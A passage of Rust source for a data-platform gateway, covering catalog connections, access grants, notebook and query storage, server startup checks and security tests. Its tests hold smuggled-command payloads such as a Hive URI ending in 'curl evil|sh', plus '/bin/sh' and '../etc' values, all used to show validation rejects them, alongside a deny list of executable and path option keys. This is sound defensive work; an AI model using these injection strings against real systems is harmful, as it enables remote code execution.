            Ok(StatusCode::NO_CONTENT)
        }
        Err(_) => Ok(StatusCode::BAD_REQUEST),
    }
}

fn grant_to_dto(g: &Grant) -> GrantDto {
    let (kind, id) = match &g.principal {
        Principal::User(u) => ("user", u.clone()),
        Principal::Group(x) => ("group", x.clone()),
        Principal::ServicePrincipal(s) => ("service_principal", s.clone()),
    };
    GrantDto {
        securable_type: format!("{:?}", g.securable.kind).to_lowercase(),
        securable_name: g.securable.name.join("."),
        privilege: format!("{:?}", g.privilege),
        principal_kind: kind.into(),
        principal_id: id,
        effect: if g.effect == Effect::Deny {
            "deny".into()
        } else {
            "allow".into()
        },
    }
}

fn dto_to_grant(d: &GrantDto) -> Result<Grant, String> {
    let kind = match d.securable_type.to_lowercase().as_str() {
        "metastore" => SecurableType::Metastore,
        "catalog" => SecurableType::Catalog,
        "schema" | "database" => SecurableType::Schema,
        "table" => SecurableType::Table,
        "view" => SecurableType::View,
        "volume" => SecurableType::Volume,
        "function" => SecurableType::Function,
        "connection" => SecurableType::Connection,
        other => return Err(format!("unknown securable type: {other}")),
    };
    let name: Vec<String> = d
        .securable_name
        .split('.')
        .filter(|s| !s.is_empty())
        .map(String::from)
        .collect();
    let privilege = privilege_from_str(&d.privilege.to_uppercase())
        .ok_or_else(|| format!("unknown privilege: {}", d.privilege))?;
    let principal = match d.principal_kind.as_str() {
        "user" => Principal::User(d.principal_id.clone()),
        "group" => Principal::Group(d.principal_id.clone()),
        "service_principal" => Principal::ServicePrincipal(d.principal_id.clone()),
        other => return Err(format!("unknown principal kind: {other}")),
    };
    let effect = if d.effect.eq_ignore_ascii_case("deny") {
        Effect::Deny
    } else {
        Effect::Allow
    };
    Ok(Grant {
        securable: Securable { kind, name },
        privilege,
        principal,
        effect,
    })
}

fn privilege_from_str(p: &str) -> Option<Privilege> {
    Some(match p {
        "SELECT" => Privilege::Select,
        "MODIFY" => Privilege::Modify,
        "EXECUTE" => Privilege::Execute,
        "USE CATALOG" => Privilege::UseCatalog,
        "USE SCHEMA" => Privilege::UseSchema,
        "CREATE CATALOG" => Privilege::CreateCatalog,
        "CREATE SCHEMA" => Privilege::CreateSchema,
        "CREATE TABLE" => Privilege::CreateTable,
        "BROWSE" => Privilege::Browse,
        "ALL PRIVILEGES" => Privilege::AllPrivileges,
        "MANAGE" => Privilege::Manage,
        _ => return None,
    })
}

// ───────────────────────────────── Connections (external catalogs) ──────────────────────────────

/// An attached catalog connection, as the UI lists it. Also the persisted record (round-tripped
/// to `WEFT_CONNECTIONS_FILE`) and the source for a cluster's startup catalog config, so `options`
/// carries everything needed to re-register the provider (Glue `region`, Hive `uri`, …).
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ConnectionInfo {
    /// The registered catalog name (use it as the first part of `name.db.table`).
    pub name: String,
    /// Connection kind: `glue` | `hive`.
    pub kind: String,
    /// Region (for Glue) — surfaced to the UI for convenience; also present in `options`.
    pub region: Option<String>,
    /// Full kind-specific options (Glue → `region`/`aws_bin`; Hive → `uri`). Used to rebuild the
    /// provider on restart and to seed a cluster's `spark.sql.catalog.<name>.*` config.
    #[serde(default)]
    pub options: HashMap<String, String>,
}

/// `POST /api/connections` body — attach an external catalog.
#[derive(Debug, Deserialize)]
pub struct CreateConnection {
    /// Catalog name to register it under.
    pub name: String,
    /// `glue` (AWS Glue Data Catalog) or `hive` (Hive Metastore over Thrift).
    pub kind: String,
    /// Kind-specific options: Glue → `region`; Hive → `uri` (`thrift://host:port`).
    #[serde(default)]
    pub options: HashMap<String, String>,
}

async fn list_connections(State(st): State<AppState>) -> Json<Vec<ConnectionInfo>> {
    Json(st.connections.lock().unwrap().clone())
}

/// Whether an option key could name an executable, filesystem path, endpoint, or command an
/// attacker could point at arbitrary code. The motivating case is Glue's `aws_bin`, which fed
/// `Command::new(options["aws_bin"])` — a request-controlled arbitrary-executable RCE on the
/// gateway host. Such keys are rejected outright (defense-in-depth on top of the per-kind allowlist).
fn is_forbidden_option_key(key: &str) -> bool {
    let k = key.to_ascii_lowercase();
    k == "aws_bin"
        || k.ends_with("_bin")
        || k.ends_with("_path")
        || k.ends_with("_endpoint")
        || k.ends_with("_cmd")
        || k.ends_with("_command")
        || k.ends_with("_exe")
}

/// A DNS-1123 label: lowercase alphanumerics and `-`, starting and ending alphanumeric, ≤ 63 chars.
/// This is simultaneously a safe SQL/catalog identifier and a valid Kubernetes object-name component
/// (the K8s backend derives namespace/object names from the connection name), so enforcing it here —
/// at the builder boundary, not only at the HTTP edge — closes name-injection into both layers.
fn is_dns1123_label(s: &str) -> bool {
    !s.is_empty()
        && s.len() <= 63
        && s.bytes().next().is_some_and(|b| b.is_ascii_alphanumeric())
        && s.bytes().last().is_some_and(|b| b.is_ascii_alphanumeric())
        && s.bytes()
            .all(|b| b.is_ascii_lowercase() || b.is_ascii_digit() || b == b'-')
}

/// An AWS region token: lowercase alphanumerics and `-` only (e.g. `us-west-2`).
fn is_aws_region(s: &str) -> bool {
    (4..=32).contains(&s.len())
        && s.contains('-')
        && s.bytes()
            .all(|b| b.is_ascii_lowercase() || b.is_ascii_digit() || b == b'-')
}

/// A conservative `scheme://host[:port]` (or `host[:port]`) charset for catalog endpoints: no quotes,
/// whitespace, or shell/label metacharacters. Keeps an endpoint inert when it is later serialized
/// into a pod's mounted catalog-conf file or a k8s label.
fn is_safe_endpoint(s: &str) -> bool {
    (1..=255).contains(&s.len())
        && s.bytes()
            .all(|b| b.is_ascii_alphanumeric() || matches!(b, b'.' | b'-' | b'_' | b':' | b'/'))
}

/// Validate an external-catalog connection request against a **per-kind typed allowlist**: the name
/// must be a DNS-1123 label, no forbidden (binary/path/endpoint/command) keys may appear, and every
/// option key must be known for the kind with a value matching its expected shape. Unknown keys are
/// rejected, not ignored. Enforced at the builder boundary so it covers the live attach path and
/// persisted-connection re-registration alike.
fn validate_connection(
    kind: &str,
    name: &str,
    options: &HashMap<String, String>,
) -> Result<(), String> {
    if !is_dns1123_label(name) {
        return Err(format!(
            "invalid connection name `{name}`: must be a DNS-1123 label \
             (lowercase alphanumerics and '-', ≤63 chars)"
        ));
    }
    for k in options.keys() {
        if is_forbidden_option_key(k) {
            return Err(format!(
                "option `{k}` is not allowed: binary/path/endpoint/command keys are forbidden"
            ));
        }
    }
    let bad = |key: &str| Err(format!("invalid value for option `{key}`"));
    match kind {
        "glue" => {
            for (k, v) in options {
                match k.as_str() {
                    "region" if is_aws_region(v) => {}
                    "region" => return bad("region"),
                    other => {
                        return Err(format!("unsupported glue option `{other}` (allowed: region)"))
                    }
                }
            }
        }
        "hive" => {
            for (k, v) in options {
                match k.as_str() {
                    "uri" | "thrift.uri" | "host" if is_safe_endpoint(v) => {}
                    "uri" | "thrift.uri" | "host" => return bad(k),
                    "port" if !v.is_empty() && v.bytes().all(|b| b.is_ascii_digit()) => {}
                    "port" => return bad("port"),
                    "type" if v.bytes().all(|b| b.is_ascii_alphanumeric()) => {}
                    "type" => return bad("type"),
                    other => {
                        return Err(format!(
                            "unsupported hive option `{other}` (allowed: uri, host, port, type)"
                        ))
                    }
                }
            }
        }
        other => return Err(format!("unsupported connection kind: {other}")),
    }
    Ok(())
}

/// Build a [`weft_catalog::CatalogProvider`] for a connection `kind` + `options`, used both by the
/// live attach path and when re-registering persisted connections on startup. Rejects any request
/// that fails [`validate_connection`] before constructing a provider.
fn build_connection_provider(
    kind: &str,
    name: &str,
    options: &HashMap<String, String>,
) -> Result<Arc<dyn weft_catalog::CatalogProvider>, String> {
    validate_connection(kind, name, options)?;
    match kind {
        "glue" => Ok(Arc::new(GlueCatalog::from_config(name, options))),
        "hive" => Ok(Arc::new(
            weft_catalog_hive::HiveCatalog::from_config(name, options)
                .map_err(|e| format!("{e:?}"))?,
        )),
        other => Err(format!("unsupported connection kind: {other}")),
    }
}

/// Attach an external catalog: construct its [`weft_catalog::CatalogProvider`] and register it on
/// the engine, so its databases/tables show up in the catalog browser and become queryable as
/// `name.database.table`. The connection is persisted so it survives a restart and is propagated
/// to every cluster the gateway provisions.
async fn create_connection(
    State(st): State<AppState>,
    Extension(claims): Extension<Claims>,
    Json(b): Json<CreateConnection>,
) -> Result<StatusCode, (StatusCode, String)> {
    oidc::require_admin(&claims)?;
    let provider = build_connection_provider(&b.kind, &b.name, &b.options)
        .map_err(|e| (StatusCode::BAD_REQUEST, e))?;
    st.engine.register_catalog(&b.name, provider);
    {
        let mut conns = st.connections.lock().unwrap();
        conns.retain(|c| c.name != b.name); // replace any prior connection with the same name
        conns.push(ConnectionInfo {
            name: b.name.clone(),
            kind: b.kind,
            region: b.options.get("region").cloned(),
            options: b.options,
        });
    }
    st.save_connections();
    Ok(StatusCode::CREATED)
}

/// Detach an external catalog by name. Removes it from the persisted set so it no longer appears in
/// the catalog browser or seeds new clusters. (DataFusion can't deregister a live catalog, so the
/// provider lingers in memory until the next restart; the catalog browser filters it out by name.)
async fn delete_connection(
    State(st): State<AppState>,
    Extension(claims): Extension<Claims>,
    Path(name): Path<String>,
) -> Result<StatusCode, (StatusCode, String)> {
    oidc::require_admin(&claims)?;
    let removed = {
        let mut conns = st.connections.lock().unwrap();
        let before = conns.len();
        conns.retain(|c| c.name != name);
        before != conns.len()
    };
    if !removed {
        return Err((StatusCode::NOT_FOUND, format!("no connection `{name}`")));
    }
    st.save_connections();
    Ok(StatusCode::NO_CONTENT)
}

// ───────────────────────────── Workspace: notebooks + saved SQL queries ─────────────────────────

/// One cell in a notebook. `kind` is `sql` | `python` | `markdown`.
#[derive(Clone, Serialize, Deserialize)]
pub struct NotebookCell {
    pub id: String,
    pub kind: String,
    pub source: String,
}

/// A saved notebook (ordered cells). Persisted to `WEFT_NOTEBOOKS_FILE`.
#[derive(Clone, Serialize, Deserialize)]
pub struct NotebookDoc {
    pub id: String,
    pub name: String,
    #[serde(default)]
    pub cells: Vec<NotebookCell>,
    #[serde(default, rename = "updatedAt")]
    pub updated_at: String,
    /// Owning principal (`Claims.sub`). Set server-side on create and preserved on save — the client
    /// cannot change it. Authorization keys off this so a principal reaches only its own notebooks.
    /// Legacy docs persisted before ownership existed deserialize to `""` (admin-only).
    #[serde(default)]
    pub owner: String,
}

/// List-view summary of a notebook (matches the web `Notebook` shape).
#[derive(Serialize)]
#[serde(rename_all = "camelCase")]
pub struct NotebookSummary {
    pub id: String,
    pub name: String,
    pub language: String,
    pub owner: String,
    pub updated_at: String,
    pub cells: usize,
}

/// A saved SQL query (the Workspace). Persisted to `WEFT_QUERIES_FILE`.
#[derive(Clone, Serialize, Deserialize)]
pub struct SavedQuery {
    pub id: String,
    pub name: String,
    #[serde(default)]
    pub sql: String,
    #[serde(default, rename = "updatedAt")]
    pub updated_at: String,
    /// Owning principal (`Claims.sub`); see [`NotebookDoc::owner`].
    #[serde(default)]
    pub owner: String,
}

/// `POST /api/notebooks` body.
#[derive(Deserialize)]
pub struct CreateNotebook {
    #[serde(default)]
    pub name: String,
}

/// `POST /api/queries` body.
#[derive(Deserialize)]
pub struct CreateQuery {
    #[serde(default)]
    pub name: String,
    #[serde(default)]
    pub sql: String,
}

async fn list_notebooks(
    State(st): State<AppState>,
    Extension(claims): Extension<Claims>,
) -> Json<Vec<NotebookSummary>> {
    let admin = st.is_admin(&claims.sub);
    let nbs = st.notebooks.lock().unwrap();
    Json(
        nbs.iter()
            .filter(|n| admin || n.owner == claims.sub)
            .map(|n| NotebookSummary {
                id: n.id.clone(),
                name: n.name.clone(),
                language: n
                    .cells
                    .first()
                    .map(|c| c.kind.clone())
                    .unwrap_or_else(|| "sql".into()),
                owner: n.owner.clone(),
                updated_at: n.updated_at.clone(),
                cells: n.cells.len(),
            })
            .collect(),
    )
}

async fn create_notebook(
    State(st): State<AppState>,
    Extension(claims): Extension<Claims>,
    Json(b): Json<CreateNotebook>,
) -> Json<NotebookDoc> {
    let name = if b.name.trim().is_empty() {
        "Untitled notebook".to_string()
    } else {
        b.name
    };
    let doc = NotebookDoc {
        id: st.new_oid("nb"),
        name,
        cells: vec![NotebookCell {
            id: st.new_oid("cell"),
            kind: "sql".into(),
            source: "SELECT * FROM glue.clickbench.hits LIMIT 10".into(),
        }],
        updated_at: now_iso(),
        owner: claims.sub.clone(),
    };
    st.notebooks.lock().unwrap().push(doc.clone());
    st.save_notebooks();
    Json(doc)
}

async fn get_notebook(
    State(st): State<AppState>,
    Extension(claims): Extension<Claims>,
    Path(id): Path<String>,
) -> Result<Json<NotebookDoc>, (StatusCode, String)> {
    let nbs = st.notebooks.lock().unwrap();
    match nbs.iter().find(|n| n.id == id) {
        // Not-found (never forbidden) when it isn't yours, so existence isn't leaked.
        Some(n) if crate::authz::owns_or_admin(&st, &claims, &n.owner) => Ok(Json(n.clone())),
        _ => Err((StatusCode::NOT_FOUND, format!("no notebook `{id}`"))),
    }
}

async fn save_notebook(
    State(st): State<AppState>,
    Extension(claims): Extension<Claims>,
    Path(id): Path<String>,
    Json(mut doc): Json<NotebookDoc>,
) -> Result<Json<serde_json::Value>, StatusCode> {
    {
        let mut nbs = st.notebooks.lock().unwrap();
        match nbs.iter_mut().find(|n| n.id == id) {
            Some(slot) => {
                // Only the owner (or an admin) may overwrite; ownership is never reassigned by the
                // client.
                if !crate::authz::owns_or_admin(&st, &claims, &slot.owner) {
                    return Err(StatusCode::NOT_FOUND);
                }
                doc.owner = slot.owner.clone();
                doc.id = id.clone();
                doc.updated_at = now_iso();
                *slot = doc.clone();
            }
            None => {
                // First save of a client-created doc → the saver owns it.
                doc.owner = claims.sub.clone();
                doc.id = id.clone();
                doc.updated_at = now_iso();
                nbs.push(doc.clone());
            }
        }
    }
    st.save_notebooks();
    Ok(Json(serde_json::json!({ "ok": true, "savedAt": doc.updated_at })))
}

async fn delete_notebook(
    State(st): State<AppState>,
    Extension(claims): Extension<Claims>,
    Path(id): Path<String>,
) -> StatusCode {
    let removed = {
        let mut nbs = st.notebooks.lock().unwrap();
        match nbs.iter().find(|n| n.id == id) {
            Some(n) if crate::authz::owns_or_admin(&st, &claims, &n.owner) => {
                nbs.retain(|n| n.id != id);
                true
            }
            _ => false, // missing or not yours → not-found (no existence leak)
        }
    };
    if removed {
        st.save_notebooks();
        StatusCode::NO_CONTENT
    } else {
        StatusCode::NOT_FOUND
    }
}

async fn list_queries(
    State(st): State<AppState>,
    Extension(claims): Extension<Claims>,
) -> Json<Vec<SavedQuery>> {
    let admin = st.is_admin(&claims.sub);
    Json(
        st.queries
            .lock()
            .unwrap()
            .iter()
            .filter(|q| admin || q.owner == claims.sub)
            .cloned()
            .collect(),
    )
}

async fn create_query(
    State(st): State<AppState>,
    Extension(claims): Extension<Claims>,
    Json(b): Json<CreateQuery>,
) -> Json<SavedQuery> {
    let name = if b.name.trim().is_empty() {
        "Untitled query".to_string()
    } else {
        b.name
    };
    let q = SavedQuery {
        id: st.new_oid("q"),
        name,
        sql: b.sql,
        updated_at: now_iso(),
        owner: claims.sub.clone(),
    };
    st.queries.lock().unwrap().push(q.clone());
    st.save_queries();
    Json(q)
}

async fn get_query(
    State(st): State<AppState>,
    Extension(claims): Extension<Claims>,
    Path(id): Path<String>,
) -> Result<Json<SavedQuery>, (StatusCode, String)> {
    let qs = st.queries.lock().unwrap();
    match qs.iter().find(|q| q.id == id) {
        Some(q) if crate::authz::owns_or_admin(&st, &claims, &q.owner) => Ok(Json(q.clone())),
        _ => Err((StatusCode::NOT_FOUND, format!("no query `{id}`"))),
    }
}

async fn save_query(
    State(st): State<AppState>,
    Extension(claims): Extension<Claims>,
    Path(id): Path<String>,
    Json(mut q): Json<SavedQuery>,
) -> Result<Json<serde_json::Value>, StatusCode> {
    {
        let mut qs = st.queries.lock().unwrap();
        match qs.iter_mut().find(|x| x.id == id) {
            Some(slot) => {
                if !crate::authz::owns_or_admin(&st, &claims, &slot.owner) {
                    return Err(StatusCode::NOT_FOUND);
                }
                q.owner = slot.owner.clone();
                q.id = id.clone();
                q.updated_at = now_iso();
                *slot = q.clone();
            }
            None => {
                q.owner = claims.sub.clone();
                q.id = id.clone();
                q.updated_at = now_iso();
                qs.push(q.clone());
            }
        }
    }
    st.save_queries();
    Ok(Json(serde_json::json!({ "ok": true, "savedAt": q.updated_at })))
}

async fn delete_query(
    State(st): State<AppState>,
    Extension(claims): Extension<Claims>,
    Path(id): Path<String>,
) -> StatusCode {
    let removed = {
        let mut qs = st.queries.lock().unwrap();
        match qs.iter().find(|q| q.id == id) {
            Some(q) if crate::authz::owns_or_admin(&st, &claims, &q.owner) => {
                qs.retain(|q| q.id != id);
                true
            }
            _ => false,
        }
    };
    if removed {
        st.save_queries();
        StatusCode::NO_CONTENT
    } else {
        StatusCode::NOT_FOUND
    }
}


/// A column in the catalog browser.
#[derive(Debug, Serialize)]
pub struct CatalogColumn {
    /// Column name.
    pub name: String,
    /// Arrow data type (display).
    pub data_type: String,
}

/// A table in the catalog browser.
#[derive(Debug, Serialize)]
pub struct CatalogTable {
    /// Table name.
    pub name: String,
    /// Columns.
    pub columns: Vec<CatalogColumn>,
}

/// A schema (namespace) in the catalog browser.
#[derive(Debug, Serialize)]
pub struct CatalogSchema {
    /// Schema name.
    pub name: String,
    /// Tables.
    pub tables: Vec<CatalogTable>,
}

/// A catalog in the catalog browser.
#[derive(Debug, Serialize)]
pub struct CatalogNamespace {
    /// Catalog name.
    pub name: String,
    /// Schemas.
    pub schemas: Vec<CatalogSchema>,
}

/// Introspect the engine's real catalogs/schemas/tables/columns — what the SQL editor can query.
async fn get_catalog(State(st): State<AppState>) -> Json<Vec<CatalogNamespace>> {
    let ctx = st.engine.ctx();
    let mut out = Vec::new();

    // 1) Built-in `main` catalog — DataFusion enumerates it eagerly (seeded tables resolved).
    if let Some(cat) = ctx.catalog("main") {
        let mut schemas = Vec::new();
        for sch_name in cat.schema_names() {
            if sch_name == "information_schema" {
                continue;
            }
            let Some(sch) = cat.schema(&sch_name) else {
                continue;
            };
            let mut tables = Vec::new();
            for tbl_name in sch.table_names() {
                if let Ok(Some(tbl)) = sch.table(&tbl_name).await {
                    tables.push(CatalogTable {
                        name: tbl_name,
                        columns: fields_to_columns(tbl.schema().fields()),
                    });
                }
            }
            schemas.push(CatalogSchema {
                name: sch_name,
                tables,
            });
        }
        if schemas.iter().any(|s| !s.tables.is_empty()) {
            out.push(CatalogNamespace {
                name: "main".into(),
                schemas,
            });
        }
    }

    // 2) Attached external catalogs (Glue / Hive). The DataFusion bridge lists these *lazily*
    // (table_names() is empty until a query resolves a table), so we enumerate through the catalog
    // provider's own async API — list databases → list tables — and resolve each table's columns
    // through the engine bridge (best-effort; a Glue/Hive hiccup just yields fewer entries).
    let conns: Vec<ConnectionInfo> = st.connections.lock().unwrap().clone();
    for conn in conns {
        let Ok(provider) = build_connection_provider(&conn.kind, &conn.name, &conn.options) else {
            continue;
        };
        let Ok(namespaces) = provider.list_namespaces(&[]).await else {
            continue;
        };
        let mut schemas = Vec::new();
        for ns in namespaces {
            let db = ns.join(".");
            let tables = provider.list_tables(&ns).await.unwrap_or_default();
            let mut tbls = Vec::new();
            for tname in tables {
                let columns = resolve_columns(ctx, &conn.name, &db, &tname).await;
                tbls.push(CatalogTable {
                    name: tname,
                    columns,
                });
            }
            schemas.push(CatalogSchema { name: db, tables: tbls });
        }
        if !schemas.is_empty() {
            out.push(CatalogNamespace {
                name: conn.name,
                schemas,
            });
        }
    }
    Json(out)
}

/// Map Arrow fields to the catalog-browser column shape.
fn fields_to_columns(fields: &weft_loom::arrow::datatypes::Fields) -> Vec<CatalogColumn> {
    fields
        .iter()
        .map(|f| CatalogColumn {
            name: f.name().clone(),
            data_type: format!("{}", f.data_type()),
        })
        .collect()
}

/// Resolve a `catalog.db.table`'s columns through the engine bridge (reads the table's schema,
/// e.g. a Parquet footer for a Glue table). Best-effort: returns `[]` if it can't be resolved.
async fn resolve_columns(
    ctx: &datafusion::prelude::SessionContext,
    catalog: &str,
    db: &str,
    table: &str,
) -> Vec<CatalogColumn> {
    let Some(cat) = ctx.catalog(catalog) else {
        return vec![];
    };
    let Some(sch) = cat.schema(db) else {
        return vec![];
    };
    match sch.table(table).await {
        Ok(Some(tbl)) => fields_to_columns(tbl.schema().fields()),
        _ => vec![],
    }
}

/// Bind and serve the gateway on `addr`. Admin credentials come from `WEFT_ADMIN_USER` /
/// `WEFT_ADMIN_PASSWORD` (defaults `admin` / `admin`), the JWT secret from `WEFT_JWT_SECRET`, and
/// the SPA directory from `WEFT_WEB_DIR` (default `web/dist`).
pub async fn serve(addr: &str) -> std::io::Result<()> {
    let user = std::env::var("WEFT_ADMIN_USER").unwrap_or_else(|_| "admin".into());
    let password = std::env::var("WEFT_ADMIN_PASSWORD").unwrap_or_else(|_| "admin".into());
    let secret =
        std::env::var("WEFT_JWT_SECRET").unwrap_or_else(|_| "weft-dev-secret-change-me".into());
    // SECURITY: refuse to boot with break-glass defaults unless explicitly in dev mode. A weak or
    // known JWT secret lets anyone forge an `admins` token (every authz check downstream trusts the
    // `sub`); a default admin password is an open front door. `WEFT_DEV_MODE=1` opts into the
    // insecure local-dev defaults.
    let dev_mode = matches!(
        std::env::var("WEFT_DEV_MODE").as_deref(),
        Ok("1") | Ok("true") | Ok("yes")
    );
    if !dev_mode {
        if secret.len() < 32 || secret == "weft-dev-secret-change-me" {
            return Err(std::io::Error::new(
                std::io::ErrorKind::InvalidInput,
                "WEFT_JWT_SECRET must be set to a strong value (≥32 bytes) in production; \
                 set WEFT_DEV_MODE=1 to allow the insecure default for local development",
            ));
        }
        if password == "admin" {
            return Err(std::io::Error::new(
                std::io::ErrorKind::InvalidInput,
                "WEFT_ADMIN_PASSWORD must be changed from the default in production; \
                 set WEFT_DEV_MODE=1 to allow it for local development",
            ));
        }
    }
    let web_dir =
        PathBuf::from(std::env::var("WEFT_WEB_DIR").unwrap_or_else(|_| "web/dist".into()));
    // Cluster runtime: the `weft` binary to spawn per cluster, and the host advertised in the
    // cluster's connect endpoint.
    let weft_bin = std::env::var("WEFT_BIN").unwrap_or_default();
    let public_host = std::env::var("WEFT_PUBLIC_HOST").unwrap_or_else(|_| "127.0.0.1".into());
    let state = AppState::with_runtime(
        &user,
        &password,
        secret.into_bytes(),
        web_dir,
        weft_bin,
        public_host,
    );
    // Restore durable state (clusters/connections from DynamoDB, workspace from S3) before serving.
    state.load_from_cloud().await;
    // Background reaper: auto-terminate idle running clusters.
    tokio::spawn(idle_reaper(state.clone()));
    let listener = tokio::net::TcpListener::bind(addr).await?;
    axum::serve(listener, app(state)).await
}

/// Periodically terminate `RUNNING` clusters that have had no activity for `idle_secs` — so
/// forgotten compute (and its EC2 cost) doesn't linger.
async fn idle_reaper(st: AppState) {
    use tokio::time::{sleep, Duration};
    if st.idle_secs == 0 {
        return;
    }
    loop {
        sleep(Duration::from_secs(60)).await;
        let now = now_secs() as u64;
        // Find running clusters idle beyond the timeout.
        let stale: Vec<String> = {
            let clusters = st.clusters.lock().unwrap();
            let activity = st.last_activity.lock().unwrap();
            clusters
                .iter()
                .filter(|(_, c)| c.state == Phase::Running.as_str())
                .filter(|(id, _)| {
                    let last = activity.get(id.as_str()).copied().unwrap_or(0);
                    now.saturating_sub(last) >= st.idle_secs
                })
                .map(|(id, _)| id.clone())
                .collect()
        };
        for id in stale {
            let mins = st.idle_secs / 60;
            st.add_event(
                &id,
                format!("Auto-terminating: idle for {mins}+ minutes (no activity)"),
            );
            kill_runtime(&st, &id).await;
            st.set_state(&id, Phase::Terminated, None);
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use axum::body::Body;
    use axum::http::Request;
    use http_body_util::BodyExt;
    use tower::ServiceExt;

    fn state() -> AppState {
        AppState::new(
            "admin",
            "secretsecret1234",
            b"test-secret".to_vec(),
            PathBuf::from("web/dist"),
        )
    }

    async fn body_json(resp: Response) -> serde_json::Value {
        let bytes = resp.into_body().collect().await.unwrap().to_bytes();
        serde_json::from_slice(&bytes).unwrap_or(serde_json::Value::Null)
    }

    async fn login_token(st: &AppState, user: &str, pass: &str) -> Option<String> {
        let resp = app(st.clone())
            .oneshot(
                Request::post("/api/auth/login")
                    .header("content-type", "application/json")
                    .body(Body::from(format!(
                        r#"{{"username":"{user}","password":"{pass}"}}"#
                    )))
                    .unwrap(),
            )
            .await
            .unwrap();
        if resp.status() != StatusCode::OK {
            return None;
        }
        body_json(resp).await["token"].as_str().map(String::from)
    }

    /// Admin-only helper: create a (possibly non-admin) user and return the response status.
    async fn create_user_via_admin(
        st: &AppState,
        admin_token: &str,
        user: &str,
        pass: &str,
        groups: &[&str],
    ) -> StatusCode {
        let groups_json = serde_json::to_string(groups).unwrap();
        app(st.clone())
            .oneshot(
                Request::post("/api/admin/users")
                    .header("content-type", "application/json")
                    .header("authorization", format!("Bearer {admin_token}"))
                    .body(Body::from(format!(
                        r#"{{"username":"{user}","password":"{pass}","groups":{groups_json}}}"#
                    )))
                    .unwrap(),
            )
            .await
            .unwrap()
            .status()
    }

    async fn post(st: &AppState, path: &str, token: &str, body: &str) -> StatusCode {
        app(st.clone())
            .oneshot(
                Request::post(path)
                    .header("content-type", "application/json")
                    .header("authorization", format!("Bearer {token}"))
                    .body(Body::from(body.to_string()))
                    .unwrap(),
            )
            .await
            .unwrap()
            .status()
    }

    /// Register a governed three-level table `main.sales.monthly_revenue` directly on the engine so
    /// the governance test has a table in a named (non-default) catalog to authorize. Main's engine
    /// seeds no local data (catalogs come from Glue), so the test sets up exactly what it needs.
    fn seed_governed_table(st: &AppState) {
        use datafusion::catalog::{CatalogProvider, MemoryCatalogProvider, MemorySchemaProvider, SchemaProvider};
        use datafusion::datasource::MemTable;
        use weft_loom::arrow::array::{Float64Array, StringArray};
        use weft_loom::arrow::datatypes::{DataType, Field, Schema};
        use weft_loom::arrow::record_batch::RecordBatch;

        let batch = RecordBatch::try_new(
            Arc::new(Schema::new(vec![
                Field::new("month", DataType::Utf8, false),
                Field::new("region", DataType::Utf8, false),
                Field::new("revenue", DataType::Float64, false),
            ])),
            vec![
                Arc::new(StringArray::from(vec!["2026-01", "2026-01", "2026-02"])),
                Arc::new(StringArray::from(vec!["US", "EU", "US"])),
                Arc::new(Float64Array::from(vec![120000.0, 88000.0, 135000.0])),
            ],
        )
        .unwrap();
        let table = Arc::new(MemTable::try_new(batch.schema(), vec![vec![batch]]).unwrap());
        let schema = Arc::new(MemorySchemaProvider::new());
        schema
            .register_table("monthly_revenue".to_string(), table)
            .unwrap();
        let catalog = Arc::new(MemoryCatalogProvider::new());
        catalog.register_schema("sales", schema).unwrap();
        let _ = st.engine.ctx().register_catalog("main", catalog);
    }

    #[test]
    fn connection_validation_rejects_injection_and_unknown_keys() {
        let opt = |pairs: &[(&str, &str)]| -> HashMap<String, String> {
            pairs
                .iter()
                .map(|(k, v)| (k.to_string(), v.to_string()))
                .collect()
        };
        // Valid baselines pass.
        assert!(validate_connection("glue", "sales", &opt(&[("region", "us-east-1")])).is_ok());
        assert!(
            validate_connection("hive", "warehouse", &opt(&[("uri", "thrift://hms:9083")])).is_ok()
        );
        // RCE #2: a request-supplied `aws_bin` (or any *_bin/_path/_cmd/_endpoint key) is rejected,
        // so it can never reach `Command::new(...)` in the Glue catalog.
        assert!(validate_connection("glue", "sales", &opt(&[("aws_bin", "/bin/sh")])).is_err());
        assert!(validate_connection("glue", "sales", &opt(&[("helper_path", "/x")])).is_err());
        assert!(validate_connection("hive", "wh", &opt(&[("meta_endpoint", "x")])).is_err());
        // Unknown keys are rejected, not silently ignored.
        assert!(validate_connection(
            "glue",
            "sales",
            &opt(&[("region", "us-east-1"), ("evil", "x")])
        )
        .is_err());
        // Quote-breakout / shell-metachar payloads in a value are rejected (kept inert downstream).
        assert!(validate_connection(
            "hive",
            "warehouse",
            &opt(&[("uri", "thrift://h:9083'; curl evil|sh; #")])
        )
        .is_err());
        // Names that aren't DNS-1123 labels are rejected (SQL identifier + k8s object-name safety).
        assert!(validate_connection("glue", "Sales DB", &opt(&[("region", "us-east-1")])).is_err());
        assert!(validate_connection("glue", "../etc", &opt(&[("region", "us-east-1")])).is_err());
        // Unsupported kind.
        assert!(validate_connection("redis", "x", &HashMap::new()).is_err());
    }

    #[test]
    fn ec2_user_data_keeps_catalog_conf_inert() {
        // A connection value carrying a shell-breakout payload must NOT appear raw in the boot
        // script; it is base64-encoded and decoded at runtime, so the shell never re-parses it.
        let payload = "spark.sql.catalog.x.uri=thrift://h:9083'; curl evil|sh; #";
        let ud = ec2_user_data("https://dl/weft", "us-west-2", payload);
        assert!(
            !ud.contains("'; curl evil|sh"),
            "raw payload leaked into boot script:\n{ud}"
        );
        assert!(!ud.contains("evil|sh"), "no raw payload anywhere:\n{ud}");
        assert!(ud.contains("base64 -d"), "conf must be decoded from base64");
        assert!(
            ud.contains(&base64_encode(payload.as_bytes())),
            "conf must be carried as its base64"
        );
        // Operator-controlled values are present (not an injection vector).
        assert!(ud.contains("AWS_REGION='us-west-2'"));
    }

    #[test]
    fn session_id_is_per_user_and_stable() {
        assert_eq!(session_id_for("alice", "c1"), session_id_for("alice", "c1"));
        assert_ne!(session_id_for("alice", "c1"), session_id_for("bob", "c1"));
        assert_ne!(session_id_for("alice", "c1"), session_id_for("alice", "c2"));
        // No longer the old hardcoded shared id.
        assert_ne!(
            session_id_for("alice", "c1"),
            "00112233-4455-6677-8899-aabbccddeeff"
        );
    }

    #[tokio::test]
    async fn non_admin_is_forbidden_from_privileged_actions() {
        let st = state();
        let admin = login_token(&st, "admin", "secretsecret1234").await.unwrap();
        // Admin provisions a non-admin user (empty groups).
        assert_eq!(
            create_user_via_admin(&st, &admin, "bob", "bobpassword12", &[]).await,
            StatusCode::CREATED
        );
        let bob = login_token(&st, "bob", "bobpassword12").await.unwrap();

        // Every privileged control-plane mutation is 403 for a non-admin.
        assert_eq!(
